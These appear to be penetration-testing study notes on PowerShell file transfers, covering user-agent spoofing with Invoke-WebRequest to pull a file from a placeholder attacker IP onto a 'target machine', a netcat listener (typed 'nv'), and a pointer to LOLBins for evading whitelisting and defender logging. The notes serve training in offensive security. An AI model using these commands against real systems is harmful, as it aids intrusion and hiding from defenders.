### Changing User Agent
- `Invoke-WebRequest` contains a UserAgent parameter, which allows for changing the default user agent
- **Listing out User Agents**
	- `[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent"; Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | f1`
- **Request with Chrome User Agent**
	- **Target Machine - Requesting**
		- `$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome`
		- `Invoke-WebRequest http://[ip address]/[file to download] -UserAgent $UserAgent -OutFile "C:\[new local filename]"`
	- **Personal Machine - Listening on Netcat**
		- `nv -lnvp 80`
****
### LOLBAS / GTFOBins
- Application whitelisting may prevent us from using PowerShell or Netcat, and command-line logging may alert defenders to our presence
- In this case, LOLBins should be used